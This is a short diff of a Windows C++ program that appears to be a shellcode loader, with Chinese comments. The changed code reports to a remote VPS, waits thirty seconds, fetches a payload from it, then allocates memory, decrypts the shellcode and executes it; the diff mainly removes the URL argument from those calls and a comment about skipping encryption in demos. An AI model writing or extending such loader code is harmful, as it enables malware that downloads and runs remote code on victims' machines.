@@ -201,11 +201,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 		size = shellcode_size;
 	}
 	else if (EnableAccessControl) {
-		std::string url = VpsUrl;
-		send_info(url);
+		send_info();
 
 		custom_sleep(1000 * 30); // 等待半分钟后开始轮询
-		shellcode_vec = fetch_payload(url);
+		shellcode_vec = fetch_payload();
 
 		size = shellcode_vec.size();
 		if (size == 0) return 0;
@@ -219,7 +218,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	// ============================= Allocate Memory ===============================
 	NTSTATUS status = AllocateMem(&lpMem, &size);
 	memcpy(lpMem, shellcode_ptr, size);
-	DecryptShellcode(lpMem, size); // 演示时不加密
+	DecryptShellcode(lpMem, size); 
 
 	ExecuteShellcodeStruct execStruct = { lpMem,size };
 	ExecuteShellcode(&execStruct);
